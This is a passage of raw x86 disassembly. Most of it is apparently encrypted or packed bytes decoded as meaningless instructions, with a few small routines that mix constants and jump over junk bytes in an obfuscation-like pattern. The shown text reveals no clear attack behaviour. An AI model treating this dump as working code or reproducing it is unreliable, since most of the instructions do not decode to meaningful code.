  4108ad:	dec    esp
  4108ae:	gs mov ah,0x4b
  4108b1:	push   0xffffff93
  4108b3:	inc    ebx
  4108b4:	dec    ebx
  4108b5:	xchg   ecx,eax
  4108b6:	scas   eax,DWORD PTR es:[edi]
  4108b7:	ss jle 0x4108a6
  4108ba:	inc    esp
  4108bb:	cs in  eax,0x2
  4108be:	int3   
  4108bf:	int3   
  4108c0:	(bad)  
  4108c1:	and    eax,0xba796403
  4108c6:	je     0x410931
  4108c8:	push   ss
  4108c9:	xor    eax,0x4165ffd9
  4108ce:	jbe    0x41090e
  4108d0:	push   ecx
  4108d1:	cld    
  4108d2:	test   al,0xf
  4108d4:	and    ah,BYTE PTR [ebp-0x6a]
  4108d7:	(bad)  
  4108d8:	and    BYTE PTR [ecx],ah
  4108da:	(bad)  
  4108db:	or     edx,DWORD PTR [ecx-0x150090a7]
  4108e1:	mov    ah,bh
  4108e3:	mov    cl,0x6d
  4108e5:	jae    0x4108aa
  4108e7:	pop    ss
  4108e8:	mov    eax,ds:0x7bebc744
  4108ed:	out    dx,eax
  4108ee:	add    dl,BYTE PTR [ecx+0x36aec8a6]
  4108f4:	pop    edx
  4108f5:	and    DWORD PTR [ebx+0x438a27c2],0xa493162b
  4108ff:	sub    esi,DWORD PTR [esi-0x4f]
  410902:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410904:	jge    0x410968
  410906:	push   eax
  410907:	addr16 fdiv st,st(1)
  41090a:	jmp    0x7185159c
  41090f:	es enter 0x249c,0xa5
  410914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410915:	fstp   TBYTE PTR [edi-0x1e]
  410918:	pop    ebx
  410919:	jecxz  0x410952
  41091b:	stc    
  41091c:	sub    cl,bh
  41091e:	sub    DWORD PTR [ebx],eax
  410920:	xor    DWORD PTR [eax+0x575ac289],0xa60903da
  41092a:	ins    BYTE PTR es:[edi],dx
  41092b:	jle    0x410917
  41092d:	test   al,0xa0
  41092f:	loope  0x410988
  410931:	(bad)  
  410932:	popa   
  410933:	push   0xffffffbc
  410935:	daa    
  410936:	push   esp
  410937:	js     0x4108c3
  410939:	in     eax,0xbd
  41093b:	and    bl,BYTE PTR [eax+0x40a3d932]
  410941:	jmp    0xbc6f:0x993a11e3
  410948:	imul   esi,esi,0x5f
  41094b:	lea    esi,[eax+0x28c20be2]
  410951:	stos   BYTE PTR es:[edi],al
  410952:	enter  0xaa0a,0xc1
  410956:	jle    0x410935
  410958:	pop    ecx
  410959:	inc    edx
  41095a:	(bad)  
  41095b:	icebp  
  41095c:	sti    
  41095d:	jno    0x4109dd
  41095f:	out    0xb4,eax
  410961:	xor    BYTE PTR [ebx],dl
  410963:	and    BYTE PTR [eax],bl
  410965:	out    dx,eax
  410966:	adc    eax,0x4d699e8f
  41096b:	jno    0x410930
  41096d:	sbb    al,0xb
  41096f:	ror    DWORD PTR [edi-0x13],1
  410972:	in     al,dx
  410973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410974:	sub    DWORD PTR [edi],esp
  410976:	nop
  410977:	push   ss
  410978:	je     0x4108fc
  41097a:	stos   DWORD PTR es:[edi],eax
  41097b:	addr16 (bad) 
  41097d:	pop    eax
  41097e:	dec    edx
  41097f:	(bad)  
  410980:	jmp    0x4109b5
  410982:	sub    al,0x24
  410984:	je     0x4109ba
  410986:	add    esi,DWORD PTR [edi+0x776d12f8]
  41098c:	inc    edx
  41098d:	fsubr  QWORD PTR es:[ebx+0xa]
  410991:	jle    0x41095a
  410993:	mov    ds:0xc69d155,eax
  410998:	call   0x1d4bd9e
  41099d:	xor    BYTE PTR [ebx+0x73],0x6a
  4109a1:	add    BYTE PTR [ecx-0x55],al
  4109a4:	mov    bl,0xa3
  4109a6:	out    dx,eax
  4109a7:	scas   eax,DWORD PTR es:[edi]
  4109a8:	jo     0x410963
  4109aa:	xor    cl,BYTE PTR [edx]
  4109ac:	mov    DWORD PTR [eax+0x2347b3bf],0x67b56906
  4109b6:	inc    ebp
  4109b7:	in     eax,dx
  4109b8:	rcl    DWORD PTR [ebp+0x73],0x7e
  4109bc:	fstp   QWORD PTR [eax+0x43]
  4109bf:	popa   
  4109c0:	mov    ?,WORD PTR [ecx]
  4109c2:	dec    ebp
  4109c3:	fild   DWORD PTR [ebx+0x4f]
  4109c6:	rep lods eax,DWORD PTR ds:[esi]
  4109c8:	bndstx [eax],bnd0
  4109cb:	sub    edx,DWORD PTR [esi+0x57b2ba38]
  4109d1:	popf   
  4109d2:	int    0x2
  4109d4:	out    0xaa,eax
  4109d6:	add    eax,0x64eb1701
  4109db:	pop    edx
  4109dc:	aam    0xff
  4109de:	pop    esi
  4109df:	dec    ebx
  4109e0:	pop    esi
  4109e1:	sar    DWORD PTR [eax+edi*4-0x2352cb5],cl
  4109e8:	daa    
  4109e9:	jge    0x410990
  4109eb:	ins    BYTE PTR es:[edi],dx
  4109ec:	in     al,0xc3
  4109ee:	dec    ebx
  4109ef:	dec    esi
  4109f0:	(bad)  
  4109f1:	and    cl,dh
  4109f3:	inc    eax
  4109f4:	jmp    0x3aaa:0xc7c38124
  4109fb:	mov    bl,0x20
  4109fd:	push   ecx
  4109fe:	xchg   ebx,eax
  4109ff:	mov    ch,0x28
  410a01:	or     eax,0x7414b6b6
  410a06:	into   
  410a07:	inc    ebx
  410a08:	mov    al,0x9b
  410a0a:	repnz cwde 
  410a0c:	push   ebx
  410a0d:	cmp    bl,BYTE PTR [ecx+edx*8+0x583a2b8]
  410a14:	out    0x8,al
  410a16:	pop    eax
  410a17:	aas    
  410a18:	div    DWORD PTR [ecx]
  410a1a:	sahf   
  410a1b:	mov    dh,0x70
  410a1d:	mov    ebp,0x6f774263
  410a22:	popa   
  410a23:	mov    al,0x7f
  410a25:	cmp    edx,DWORD PTR [ecx]
  410a27:	adc    bl,0x8b
  410a2a:	jg     0x410a6c
  410a2c:	add    al,0xe6
  410a2e:	pop    ebx
  410a2f:	(bad)  
  410a30:	jmp    0x410a67
  410a32:	rcl    DWORD PTR [ecx],cl
  410a34:	xchg   edx,eax
  410a35:	mov    al,ds:0x158158e0
  410a3a:	fst    QWORD PTR [ecx-0x6d]
  410a3d:	out    dx,eax
  410a3e:	dec    edx
  410a3f:	scas   al,BYTE PTR es:[edi]
  410a40:	outs   dx,BYTE PTR ds:[esi]
  410a41:	cdq    
  410a42:	sar    BYTE PTR [ebp+edx*8+0x35ab6b3a],0x5d
  410a4a:	xchg   ecx,eax
  410a4b:	gs adc eax,0xfdb1c906
  410a51:	xor    DWORD PTR [ecx+esi*8+0x4a],esp
  410a55:	rcr    DWORD PTR [esi+0x5ea0ffe0],0x58
  410a5c:	int3   
  410a5d:	in     al,0x16
  410a5f:	cmp    al,0x7a
  410a61:	fs jne 0x410a0e
  410a64:	call   0xb54f:0xc4c38de7
  410a6b:	es mov bh,0x3d
  410a6e:	sbb    DWORD PTR es:[eax+eax*8],edx
  410a72:	jno    0x410a89
  410a74:	popa   
  410a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a76:	iret   
  410a77:	sar    DWORD PTR [ebx+0x29],0xb7
  410a7b:	add    BYTE PTR [edi-0x36425a3f],ah
  410a81:	adc    BYTE PTR [edx+edx*4-0x34],dh
  410a85:	enter  0x9c63,0x58
  410a89:	mov    al,ds:0xb9ef659c
  410a8e:	retf   0x78d6
  410a91:	sbb    eax,0x3a830355
  410a96:	sbb    esp,DWORD PTR [ecx]
  410a98:	(bad)  
  410a99:	lods   al,BYTE PTR ds:[esi]
  410a9a:	out    dx,eax
  410a9b:	not    BYTE PTR [ebp+0x14]
  410a9e:	aad    0x46
  410aa0:	push   es
  410aa1:	adc    BYTE PTR [esi],bh
  410aa3:	gs cmp al,0x94
  410aa6:	aad    0xa6
  410aa8:	and    DWORD PTR [ecx],edi
  410aaa:	mov    esp,0x5007cf2f
  410aaf:	lods   al,BYTE PTR ds:[esi]
  410ab0:	add    dl,BYTE PTR [ebx+0x42c5a3ea]
  410ab6:	jg     0x410adb
  410ab8:	adc    eax,0x6dee8c9c
  410abd:	jp     0x410a6e
  410abf:	xor    eax,0x363180ee
  410ac4:	dec    ebx
  410ac5:	(bad)  
  410ac6:	neg    BYTE PTR [ecx+0x14e03456]
  410acc:	ins    BYTE PTR es:[edi],dx
  410acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ace:	stc    
  410acf:	not    DWORD PTR [eax]
  410ad1:	js     0x410a7d
  410ad3:	mov    al,ds:0xae670e10
  410ad8:	inc    esi
  410ad9:	jmp    0x77e51e8c
  410ade:	jne    0x410a97
  410ae0:	test   al,0x94
  410ae2:	mov    ebp,0x7bb510b3
  410ae7:	(bad)  
  410ae9:	or     cl,BYTE PTR [ebx+0x18]
  410aec:	out    0xd9,eax
  410aee:	ror    DWORD PTR [eax],cl
  410af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410af1:	xchg   edi,eax
  410af2:	test   BYTE PTR [edi],al
  410af4:	add    DWORD PTR ds:0x3eae1be9,ecx
  410afa:	mov    esp,0x1b3f1bdd
  410aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b00:	add    al,BYTE PTR [edx+eiz*2]
  410b03:	xchg   edx,eax
  410b04:	inc    ebx
  410b05:	jl     0x410b2a
  410b07:	adc    eax,0xcd0b5aca
  410b0c:	es inc ebp
  410b0e:	mov    ebx,0xc04091d5
  410b13:	mov    dh,0xbc
  410b15:	aas    
  410b16:	arpl   WORD PTR [edi-0x11],di
  410b19:	ja     0x410b61
  410b1b:	(bad)  [ebx+0xc1394b2]
  410b21:	js     0x410b2b
  410b23:	jge    0x410b70
  410b25:	pop    esi
  410b26:	enter  0x24b1,0xa1
  410b2a:	rcr    BYTE PTR [ecx+0x6e02d526],0xbe
  410b31:	loopne 0x410ba3
  410b33:	xchg   BYTE PTR [ecx],cl
  410b35:	idiv   BYTE PTR [ebp-0x35380340]
  410b3b:	fistp  WORD PTR [esi]
  410b3d:	sub    al,0x26
  410b3f:	add    cl,dl
  410b41:	arpl   WORD PTR [ecx-0x112236b2],di
  410b47:	sbb    eax,0x7e37e583
  410b4c:	xor    al,0x58
  410b4e:	mov    bh,0x17
  410b50:	lahf   
  410b51:	or     esp,DWORD PTR [ebx]
  410b53:	xor    bh,BYTE PTR ds:0x9a4a4ee5
  410b59:	fcomp  QWORD PTR [edx+0x61]
  410b5c:	jmp    0x4639:0xc0709d73
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz dec ebx
  410ba5:	inc    eax
  410ba6:	pop    ds
  410ba7:	mov    dh,0x3e
  410ba9:	inc    edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c20
  410bb1:	push   0xbe3825e8
  410bb6:	dec    eax
  410bb7:	add    cl,BYTE PTR [esi]
  410bb9:	or     BYTE PTR [edx-0x9],dh
  410bbc:	sahf   
  410bbd:	and    BYTE PTR [ebp-0x3485e6a9],al
  410bc3:	pop    edi
  410bc4:	mov    ecx,0x34424119
  410bc9:	addr16 jbe 0x410b4e
  410bcc:	inc    ebx
  410bcd:	jbe    0x410b95
  410bcf:	pusha  
  410bd0:	mov    ebp,DWORD PTR [ebp+0x2]
  410bd3:	retf   
  410bd4:	push   ecx
  410bd5:	inc    ebx
  410bd6:	call   0x885f0016
  410bdb:	xchg   edi,eax
  410bdc:	ins    DWORD PTR es:[edi],dx
  410bdd:	and    ah,dh
  410bdf:	stos   BYTE PTR es:[edi],al
  410be0:	retf   
  410be1:	add    al,0x4e
  410be3:	pop    esp
  410be4:	or     BYTE PTR [edi+0x6633c200],ah
  410bea:	out    dx,al
  410beb:	xchg   ecx,eax
  410bec:	push   es
  410bed:	dec    esp
  410bee:	xor    ecx,DWORD PTR [esi+edi*2]
  410bf1:	sti    
  410bf2:	cmp    edx,esp
  410bf4:	mov    esp,0x3d5d646d
  410bf9:	sub    DWORD PTR [ebx],ebp
  410bfb:	cs or  al,ch
  410bfe:	pusha  
  410bff:	fisubr DWORD PTR [ecx]
  410c01:	xchg   esi,eax
  410c02:	sbb    DWORD PTR [esi],eax
  410c04:	jns    0x410c81
  410c06:	or     BYTE PTR [edx+0x7ebd6c4],al
  410c0c:	jge    0x410c79
  410c0e:	mov    dl,0x43
  410c10:	adc    ecx,ebx
  410c12:	clc    
  410c13:	fisttp WORD PTR [eax]
  410c15:	ror    DWORD PTR [esi],1
  410c17:	inc    ebp
  410c18:	es int 0x8a
  410c1b:	fs dec ecx
  410c1d:	mov    edi,0x5b02af16
  410c22:	into   
  410c23:	sbb    dh,BYTE PTR [edx+0x3cd40874]
  410c29:	lds    edi,FWORD PTR [eax+0x76]
  410c2c:	mov    dl,0xd7
  410c2e:	push   0x76c9c5cc
  410c33:	nop
  410c34:	(bad)  
  410c35:	xchg   esi,eax
  410c36:	clc    
  410c37:	mov    eax,ds:0x8a403ff6
  410c3c:	inc    ebx
  410c3d:	or     eax,0x90903577
  410c42:	lahf   
  410c43:	ins    DWORD PTR es:[edi],dx
  410c44:	adc    BYTE PTR ds:0x7381aadb,bl
  410c4a:	call   DWORD PTR [ebx-0x68]
  410c4d:	add    DWORD PTR [eax-0x17],ebp
  410c50:	mov    ds:0x8333e887,eax
  410c55:	js     0x410be9
  410c57:	dec    ecx
  410c58:	test   BYTE PTR [edx+0x51],0x92
  410c5c:	adc    eax,esi
  410c5e:	xor    BYTE PTR [ecx-0x6bcd9491],0x1c
  410c65:	xchg   edi,eax
  410c66:	js     0x410c07
  410c68:	(bad)  
  410c6a:	inc    eax
  410c6b:	mov    eax,0x1653c766
  410c70:	mov    esp,0x4dab3c2c
  410c75:	dec    eax
  410c76:	je     0x410cac
  410c78:	retf   0xdcc2
  410c7b:	pop    esi
  410c7c:	cmp    BYTE PTR [edi+ebp*2-0x52],cl
  410c80:	loope  0x410c92
  410c82:	bound  ebp,QWORD PTR [esi+eax*8-0x7c293b6c]
  410c89:	cld    
  410c8a:	ins    BYTE PTR es:[edi],dx
  410c8b:	and    dl,bl
  410c8d:	leave  
  410c8e:	and    DWORD PTR [ebp+esi*8-0x7f],0xcb00ef76
  410c96:	mov    WORD PTR [ecx+ebx*4+0x7697d17f],fs
  410c9d:	jle    0x410c40
  410c9f:	stc    
  410ca0:	mov    bh,0x30
  410ca2:	cmp    al,0xfc
  410ca4:	pop    ebp
  410ca5:	mov    dl,0xbc
  410ca7:	es pop ds
  410ca9:	and    dl,BYTE PTR [esp+eax*2-0x329d153f]
  410cb0:	mov    cl,0xc9
  410cb2:	dec    edx
  410cb3:	cwde   
  410cb4:	call   FWORD PTR [edx-0x46e8f27f]
  410cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cbb:	fwait
  410cbc:	cmp    DWORD PTR [esp+ecx*1],ebp
  410cbf:	mov    bl,BYTE PTR [edi+edx*2+0x5e]
  410cc3:	iret   
  410cc4:	cmc    
  410cc5:	inc    esi
  410cc6:	inc    DWORD PTR [edi]
  410cc8:	sub    esi,DWORD PTR [ecx+0x61b4eb12]
  410cce:	div    esi
  410cd0:	xlat   BYTE PTR ds:[ebx]
  410cd1:	aaa    
  410cd2:	mov    edx,0x8ef5abaa
  410cd7:	cmp    edi,eax
  410cd9:	mov    DWORD PTR [esi+edi*1],edx
  410cdc:	jo     0x410cdf
  410cde:	loopne 0x410c98
  410ce0:	push   edx
  410ce1:	mov    dh,BYTE PTR [ebx+0x7b]
  410ce4:	mov    eax,0x1c99b7c4
  410ce9:	push   ss
  410cea:	daa    
  410ceb:	test   edx,eax
  410ced:	retf   
  410cee:	mov    al,0xe9
  410cf0:	inc    ebp
  410cf1:	mov    ch,0x3b
  410cf3:	jle    0x410d4a
  410cf5:	retf   
  410cf6:	inc    esp
  410cf7:	pop    ebx
  410cf8:	scas   al,BYTE PTR es:[edi]
  410cf9:	and    eax,0x4f674283
  410cfe:	ins    DWORD PTR es:[edi],dx
  410cff:	into   
  410d00:	pop    esp
  410d01:	ja     0x410cca
  410d03:	dec    ebx
  410d04:	xor    ebp,0x12cedcb2
  410d0a:	push   0xa7f614f3
  410d0f:	shr    BYTE PTR [edx-0x47],1
  410d12:	pop    eax
  410d13:	loop   0x410c99
  410d15:	cmp    DWORD PTR [esi],esp
  410d17:	jmp    0xe267aa15
  410d1c:	mov    ebp,0xb08d29b
  410d21:	test   BYTE PTR [ecx-0xd],0x9
  410d25:	scas   eax,DWORD PTR es:[edi]
  410d26:	test   DWORD PTR [esi],ebx
  410d28:	jge    0x410d9f
  410d2a:	or     ch,BYTE PTR [edi]
  410d2c:	lods   eax,DWORD PTR ds:[esi]
  410d2d:	sahf   
  410d2e:	les    edi,FWORD PTR ds:0x39ed2ab6
  410d34:	sahf   
  410d35:	xchg   ebp,eax
  410d36:	cs push esp
  410d38:	xchg   ecx,eax
  410d39:	mov    edx,0xe74afcb9
  410d3e:	push   ss
  410d3f:	mov    dl,0xa9
  410d41:	pop    ebx
  410d42:	retf   0x2eed
  410d45:	push   ds
  410d46:	lods   eax,DWORD PTR ds:[esi]
  410d47:	cdq    
  410d48:	sub    al,0x7c
  410d4a:	mov    BYTE PTR [edx+ebp*4-0x75],0xba
  410d4f:	sub    dl,BYTE PTR gs:[ebp+0x76]
  410d53:	hlt    
  410d54:	jns    0x410d48
  410d56:	cs xchg esi,eax
  410d58:	out    dx,eax
  410d59:	adc    DWORD PTR fs:0xf3ba4bc0,ecx
  410d60:	sub    BYTE PTR [edx],0x14
  410d63:	mov    ds,WORD PTR [edx-0x75]
  410d66:	retf   
  410d67:	inc    esi
  410d68:	cmp    cl,BYTE PTR [eax+0xa5e2966]
  410d6e:	push   ebp
  410d6f:	adc    al,0x4e
  410d71:	push   edi
  410d72:	xchg   ecx,eax
  410d73:	test   bh,al
  410d75:	xchg   edx,eax
  410d76:	inc    eax
  410d77:	dec    ecx
  410d78:	pop    esi
  410d79:	push   esp
  410d7a:	cmp    al,0xb4
  410d7c:	dec    eax
  410d7d:	sbb    dl,dh
  410d7f:	push   ds
  410d80:	adc    eax,0xe3cc43c9
  410d85:	in     eax,0x27
  410d87:	lea    edi,[eax+0x13]
  410d8a:	xor    al,0x3d
  410d8c:	repz popf 
  410d8e:	pop    ds
  410d8f:	iret   
  410d90:	add    al,0x35
  410d92:	shr    BYTE PTR [esi],1
  410d94:	inc    ebx
  410d95:	and    DWORD PTR [ebp-0x1d07cbf0],ebp
  410d9b:	cmp    ebx,DWORD PTR [edi-0x4]
  410d9e:	xchg   DWORD PTR [ebx+0x7d],esp
  410da1:	stc    
  410da2:	cmp    BYTE PTR [esi+0x50],dl
  410da5:	repnz xchg esi,eax
  410da7:	fwait
  410da8:	cmp    eax,0x54351eef
  410dad:	inc    esi
  410dae:	not    BYTE PTR [ecx+eiz*2]
  410db1:	xchg   ecx,ebp
  410db3:	cmp    al,0xb
  410db5:	jl     0x410e30
  410db7:	jecxz  0x410d8a
  410db9:	cmp    esi,eax
  410dbb:	arpl   WORD PTR [eax],si
  410dbd:	js     0x410d7f
  410dbf:	shl    bl,cl
  410dc1:	inc    edi
  410dc2:	out    dx,al
  410dc3:	push   cs
  410dc4:	es push ebx
  410dc6:	icebp  
  410dc7:	(bad)  
  410dc8:	fs call 0x846c:0x4616da40
  410dd0:	shl    DWORD PTR [edi],0x73
  410dd3:	cli    
  410dd4:	fimul  WORD PTR [edi+0x7bb503cd]
  410dda:	add    eax,0x8596580c
  410ddf:	xor    al,0x4a
  410de1:	and    al,0x9f
  410de3:	test   eax,0x7dd7ca88
  410de8:	cmp    bh,BYTE PTR [eax]
  410dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410deb:	test   al,0x25
  410ded:	cwde   
  410dee:	aam    0xd
  410df0:	aaa    
  410df1:	cmp    DWORD PTR [edi],edi
  410df3:	retf   
  410df4:	pop    ecx
  410df5:	idiv   BYTE PTR [edx]
  410df7:	add    edi,DWORD PTR [edi-0x24]
  410dfa:	test   eax,0x87839c38
  410dff:	xlat   BYTE PTR ds:[ebx]
  410e00:	inc    esi
  410e01:	mov    edx,0xbdd70262
  410e06:	dec    eax
  410e07:	bnd ret 
  410e09:	pop    edx
  410e0a:	xchg   ebx,eax
  410e0b:	outs   dx,DWORD PTR ds:[esi]
  410e0c:	xor    esp,DWORD PTR [ebp-0x6d]
  410e0f:	xlat   BYTE PTR ds:[ebx]
  410e10:	test   BYTE PTR es:[eax+eiz*8-0x64],ah
  410e15:	(bad)  
  410e16:	icebp  
  410e17:	adc    al,0x84
  410e19:	fnstsw WORD PTR [edi]
  410e1b:	mov    edx,0x7cbb4c22
  410e20:	pushf  
  410e21:	outs   dx,BYTE PTR ds:[esi]
  410e22:	adc    bl,al
  410e24:	jmp    0x410e2d
  410e26:	imul   ebp,DWORD PTR [ecx+0x6fc3574a],0xffffffd5
  410e2d:	rsqrtps xmm6,XMMWORD PTR [ebx]
  410e30:	scas   al,BYTE PTR es:[edi]
  410e31:	sub    bl,0x75
  410e34:	dec    eax
  410e35:	popf   
  410e36:	push   esp
  410e37:	xor    ecx,DWORD PTR [ebx+0x4652dd56]
  410e3d:	(bad)  
  410e3e:	out    0xb7,eax
  410e40:	dec    ebp
  410e41:	xchg   DWORD PTR [eax],ebx
  410e43:	aad    0x4e
  410e45:	imul   edi,DWORD PTR [ebx+0x55],0x7f78d83e
  410e4c:	inc    ebx
  410e4d:	in     eax,dx
  410e4e:	add    BYTE PTR [esi],0xd6
  410e51:	jmp    0x7263c16f
  410e56:	mov    ah,0x9
  410e58:	pop    esi
  410e59:	ja     0x410e9c
  410e5b:	ret    
  410e5c:	inc    edi
  410e5d:	dec    esi
  410e5e:	sub    bl,BYTE PTR [esi-0x72acb837]
  410e64:	pop    ss
  410e65:	sbb    al,0x89
  410e67:	xor    ecx,DWORD PTR [ebx-0x21]
  410e6a:	pop    ss
  410e6b:	stos   BYTE PTR es:[edi],al
  410e6c:	mov    dl,0x49
  410e6e:	fistp  QWORD PTR ds:0x5278f545
  410e74:	(bad)  
  410e75:	adc    DWORD PTR [ecx-0x54],edi
  410e78:	int3   
  410e79:	mov    ecx,0x7af8c3e9
  410e7e:	cmp    BYTE PTR [ebx+0x24],bh
  410e81:	repnz inc ecx
  410e83:	cmp    eax,0x1ff26d05
  410e88:	mov    edi,0xe449a967
  410e8d:	daa    
  410e8e:	sbb    eax,0xcf3bdbb1
  410e93:	inc    ebx
  410e94:	jbe    0x410eea
  410e96:	mov    dl,0x25
  410e98:	xor    bh,ch
  410e9a:	mov    eax,0x862085e8
  410e9f:	jbe    0x410ef4
  410ea1:	mov    eax,ds:0x7dacd9b4
  410ea6:	adc    cl,BYTE PTR [ecx+0x3f10f9b6]
  410eac:	mov    al,0x59
  410eae:	xchg   ecx,eax
  410eaf:	call   0xeebc:0x1d476729
  410eb6:	pop    es
  410eb7:	cwde   
  410eb8:	(bad)  [ebp+esi*8+0x66edd45e]
  410ebf:	stc    
  410ec0:	xor    DWORD PTR [edx-0x5b6cfad3],edi
  410ec6:	or     al,0x76
  410ec8:	stos   BYTE PTR es:[edi],al
  410ec9:	push   ds
  410eca:	pop    ss
  410ecb:	dec    ebx
  410ecc:	xchg   edx,eax
  410ecd:	lea    ebx,[ebx+0x34de8561]
  410ed3:	pop    ds
  410ed4:	clc    
  410ed5:	push   edx
  410ed6:	repnz sub ebp,DWORD PTR [eax]
  410ed9:	clc    
  410eda:	and    esp,DWORD PTR [ebp+0x75d862ca]
  410ee0:	aaa    
  410ee1:	inc    ecx
  410ee2:	lds    esi,FWORD PTR [ebp+0x27]
  410ee5:	call   0xdaccefd5
  410eea:	mov    ebp,0x33303a8a
  410eef:	xchg   edx,eax
  410ef0:	fst    QWORD PTR [ebx+0x73]
  410ef3:	imul   bh
  410ef5:	ins    BYTE PTR es:[edi],dx
  410ef6:	stos   BYTE PTR es:[edi],al
  410ef7:	inc    edi
  410ef8:	fcomp  st(1)
  410efa:	je     0x410e92
  410efc:	rol    ch,cl
  410efe:	sub    BYTE PTR [ecx],al
  410f00:	out    0x8d,al
  410f02:	pusha  
  410f03:	sar    DWORD PTR [ecx+0xbf3d547],cl
  410f09:	(bad)  
  410f0a:	icebp  
  410f0b:	mov    dh,0xaa
  410f0d:	and    al,BYTE PTR [eax+0x3ba54f93]
  410f13:	inc    eax
  410f14:	stos   BYTE PTR es:[edi],al
  410f15:	int3   
  410f16:	jp     0x410ec1
  410f18:	nop
  410f19:	xchg   esi,eax
  410f1a:	out    dx,al
  410f1b:	jns    0x410eef
  410f1d:	sub    ebx,DWORD PTR [edx]
  410f1f:	fidiv  DWORD PTR ds:0x1f97409f
  410f25:	add    ecx,DWORD PTR [eax+edi*1]
  410f28:	aas    
  410f29:	loope  0x410f2b
  410f2b:	and    ecx,esi
  410f2d:	jle    0x410f0b
  410f2f:	mov    bl,0x2d
  410f31:	cwde   
  410f32:	add    DWORD PTR [ebx],ecx
  410f34:	xlat   BYTE PTR ds:[ebx]
  410f35:	sahf   
  410f36:	mov    ebx,0x25a80b28
  410f3b:	jb     0x410f2f
  410f3d:	icebp  
  410f3e:	mov    ebx,0xb5a20c0a
  410f43:	push   ecx
  410f44:	mov    edx,0x4cc39a99
  410f49:	mov    ebp,0xcc506dc3
  410f4e:	pop    edx
  410f4f:	out    dx,al
  410f50:	popa   
  410f51:	or     BYTE PTR [esi],dl
  410f53:	xchg   edi,eax
  410f54:	mov    esp,DWORD PTR [eax]
  410f56:	jmp    0x410f70
  410f58:	sahf   
  410f59:	ss jbe 0x410f4d
  410f5c:	cwde   
  410f5d:	jg     0x410f0f
  410f5f:	les    esp,FWORD PTR [edi-0x6d]
  410f62:	fst    QWORD PTR [ebp+0x1a]
  410f65:	add    BYTE PTR [ebp+ecx*2+0x23],al
  410f69:	jp     0x410f48
  410f6b:	push   ss
  410f6c:	mov    ch,0x32
  410f6e:	in     eax,0x4d
  410f70:	(bad)  
  410f71:	data16 jnp 0x410f13
  410f74:	push   ds
  410f75:	jg     0x410f4a
  410f77:	add    al,0x9c
  410f79:	lea    esi,[ebx+0x25]
  410f7c:	daa    
  410f7d:	jno    0x410f13
  410f7f:	shl    BYTE PTR [eax+edx*8-0x3c854659],cl
  410f86:	mov    ebp,0x44d0a2c3
  410f8b:	and    DWORD PTR [edi+0x70],0xfffffff7
  410f8f:	push   ebx
  410f90:	iret   
  410f91:	dec    esi
  410f92:	and    BYTE PTR [edx],dh
  410f94:	jmp    0xa231faad
  410f99:	sub    al,0xb2
  410f9b:	inc    ecx
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x29c03abe]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410ff4
  410fdd:	inc    edx
  410fde:	rol    ecx,cl
  410fe0:	add    eax,0x4192036c
  410fe5:	push   eax
  410fe6:	xor    BYTE PTR [edx+0x64],cl
  410fe9:	pop    ds
  410fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410feb:	js     0x411034
  410fed:	jmp    0x52cd:0xb5c1807b
  410ff4:	sbb    BYTE PTR [eax-0x2229e5ac],bh
  410ffa:	or     ah,BYTE PTR [edx]
  410ffc:	mov    al,0x2f
  410ffe:	mov    esp,0xd580c854
  411003:	in     eax,dx
  411004:	out    0xd0,al
  411006:	out    0x7b,eax
  411008:	inc    esp
  411009:	mov    dh,0x8a
  41100b:	cld    
  41100c:	pop    esp
  41100d:	jmp    0x9e18:0xad7ea1a2
  411014:	mov    al,0x85
  411016:	xor    al,0xd5
  411018:	mov    es,ebp
  41101a:	clc    
  41101b:	ins    BYTE PTR es:[edi],dx
  41101c:	dec    eax
  41101d:	jbe    0x411039
  41101f:	leave  
  411020:	dec    esi
  411021:	sub    DWORD PTR [ebx-0x4c],esp
  411024:	pop    ebx
  411025:	pop    ss
  411026:	dec    esi
  411027:	jnp    0x41108d
  411029:	test   al,0x1c
  41102b:	mov    ebp,0xfae770bf
  411030:	inc    edx
  411031:	pushf  
  411032:	(bad)  
  411033:	adc    ah,al
  411035:	aad    0x28
  411037:	or     bh,BYTE PTR [edx-0x6e]
  41103a:	sbb    eax,0xe41083f8
  41103f:	das    
  411040:	pop    ds
  411041:	pushf  
  411042:	outs   dx,DWORD PTR ds:[esi]
  411043:	jg     0x4110a7
  411045:	fcom   QWORD PTR [eax]
